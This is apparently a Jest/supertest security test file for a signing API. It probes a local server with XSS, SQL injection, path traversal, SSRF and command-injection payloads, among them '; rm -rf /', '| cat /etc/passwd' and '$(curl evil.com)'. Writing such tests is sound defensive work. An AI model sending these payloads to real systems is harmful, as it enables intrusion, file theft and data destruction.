/**
 * Injection Attack Prevention Tests
 * Testing XSS, injection, and other security vulnerabilities
 */

import request from 'supertest';

describe('Injection Prevention Tests', () => {
  const baseUrl = 'http://localhost:3000';
  const apiKey = 'demo-admin-key';

  describe('XSS Prevention in Metadata', () => {
    it('should reject script tags in custom assertions', async () => {
      const maliciousInput = {
        customAssertions: JSON.stringify([
          {
            claim: '<script>alert("XSS")</script>',
            data: { test: 'value' }
          }
        ])
      };

      const response = await request(baseUrl)
        .post('/api/sign')
        .set('X-API-Key', apiKey)
        .set('Content-Type', 'application/json')
        .send(maliciousInput);

      // Should either reject (400) or sanitize
      if (response.status === 400) {
        expect(response.body.error.message).toContain('Invalid');
      } else {
        // If accepted, response should be sanitized
        expect(JSON.stringify(response.body)).not.toContain('<script>');
      }
    });

    it('should escape HTML entities in responses', async () => {
      const response = await request(baseUrl)
        .get('/api/status')
        .set('X-API-Key', apiKey)
        .expect(200);

      const responseText = JSON.stringify(response.body);
      expect(responseText).not.toContain('<script>');
      expect(responseText).not.toContain('javascript:');
      expect(responseText).not.toContain('onerror=');
    });

    it('should reject javascript: protocol in URIs', async () => {
      const maliciousInput = {
        proofUri: 'javascript:alert("XSS")',
        customAssertions: '[]'
      };

      const response = await request(baseUrl)
        .post('/api/sign')
        .set('X-API-Key', apiKey)
        .set('Content-Type', 'application/json')
        .send(maliciousInput);

      // Should reject or sanitize
      expect(response.status).not.toBe(200);
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should reject SQL injection in custom assertions', async () => {
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "1' UNION SELECT * FROM passwords--"
      ];

      for (const malicious of maliciousInputs) {
        const response = await request(baseUrl)
          .post('/api/sign')
          .set('X-API-Key', apiKey)
          .set('Content-Type', 'application/json')
          .send({
            customAssertions: JSON.stringify([
              { claim: malicious, data: {} }
            ])
          });

        // Should reject or sanitize
        if (response.status === 400) {
          expect(response.body.error.message).toContain('Invalid');
        }
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should reject path traversal in proof URIs', async () => {
      const maliciousInputs = [
        'https://example.com/../../etc/passwd',
        'https://example.com/../../../root/.ssh/id_rsa',
        'file:///etc/passwd'
      ];

      for (const maliciousUri of maliciousInputs) {
        const response = await request(baseUrl)
          .post('/api/sign')
          .set('X-API-Key', apiKey)
          .set('Content-Type', 'application/json')
          .send({
            proofUri: maliciousUri,
            customAssertions: '[]'
          });

        expect(response.status).not.toBe(200);
      }
    });

    it('should reject file:// protocol', async () => {
      const response = await request(baseUrl)
        .post('/api/sign')
        .set('X-API-Key', apiKey)
        .set('Content-Type', 'application/json')
        .send({
          proofUri: 'file:///etc/passwd',
          customAssertions: '[]'
        });

      expect(response.status).not.toBe(200);
    });
  });

  describe('SSRF Prevention', () => {
    it('should reject localhost URLs', async () => {
      const localUrls = [
        'http://localhost:8080/admin',
        'http://127.0.0.1/internal',
        'http://0.0.0.0/config'
      ];

      for (const url of localUrls) {
        const response = await request(baseUrl)
          .post('/api/sign')
          .set('X-API-Key', apiKey)
          .set('Content-Type', 'application/json')
          .send({
            proofUri: url,
            customAssertions: '[]'
          });

        // Should be rejected
        expect(response.status).not.toBe(200);
      }
    });

    it('should reject private IP ranges', async () => {
      const privateIPs = [
        'http://10.0.0.1/internal',
        'http://172.16.0.1/admin',
        'http://192.168.1.1/config'
      ];

      for (const ip of privateIPs) {
        const response = await request(baseUrl)
          .post('/api/sign')
          .set('X-API-Key', apiKey)
          .set('Content-Type', 'application/json')
          .send({
            proofUri: ip,
            customAssertions: '[]'
          });

        // Should be rejected
        expect(response.status).not.toBe(200);
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should reject shell commands in filenames', async () => {
      // This would be tested with actual file upload
      // For now, test with metadata fields
      const maliciousInputs = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '`whoami`',
        '$(curl evil.com)'
      ];

      for (const malicious of maliciousInputs) {
        const response = await request(baseUrl)
          .post('/api/sign')
          .set('X-API-Key', apiKey)
          .set('Content-Type', 'application/json')
          .send({
            title: malicious,
            customAssertions: '[]'
          });

        // Should be sanitized or rejected
        if (response.status === 200) {
          expect(response.body.manifest_id).toBeDefined();
          // Verify no command execution occurred
        }
      }
    });
  });

  describe('Response Sanitization', () => {
    it('should not leak sensitive data in errors', async () => {
      const response = await request(baseUrl)
        .post('/api/sign')
        .set('X-API-Key', 'invalid')
        .set('Content-Type', 'application/json')
        .send({})
        .expect(401);

      const errorText = JSON.stringify(response.body);
      
      // Should not contain sensitive info
      expect(errorText).not.toMatch(/password/i);
      expect(errorText).not.toMatch(/secret/i);
      expect(errorText).not.toMatch(/token/i);
      expect(errorText).not.toMatch(/key/i);
    });

    it('should sanitize stack traces', async () => {
      const response = await request(baseUrl)
        .get('/api/cause-error-test')
        .expect(404);

      const errorText = JSON.stringify(response.body);
      
      // Should not leak internal paths
      expect(errorText).not.toContain('/Users/');
      expect(errorText).not.toContain('node_modules');
      expect(errorText).not.toContain('.env');
    });
  });

  describe('Input Validation', () => {
    it('should enforce length limits on custom assertions', async () => {
      const longClaim = 'a'.repeat(1000);
      
      const response = await request(baseUrl)
        .post('/api/sign')
        .set('X-API-Key', apiKey)
        .set('Content-Type', 'application/json')
        .send({
          customAssertions: JSON.stringify([
            { claim: longClaim, data: {} }
          ])
        });

      // Should reject or truncate
      if (response.status === 400) {
        expect(response.body.error.message).toContain('too long');
      }
    });

    it('should limit number of custom assertions', async () => {
      const manyAssertions = Array.from({ length: 20 }, (_, i) => ({
        claim: `claim${i}`,
        data: {}
      }));

      const response = await request(baseUrl)
        .post('/api/sign')
        .set('X-API-Key', apiKey)
        .set('Content-Type', 'application/json')
        .send({
          customAssertions: JSON.stringify(manyAssertions)
        });

      // Should reject if too many
      if (response.status === 400) {
        expect(response.body.error.message).toContain('Too many');
      }
    });
  });
});
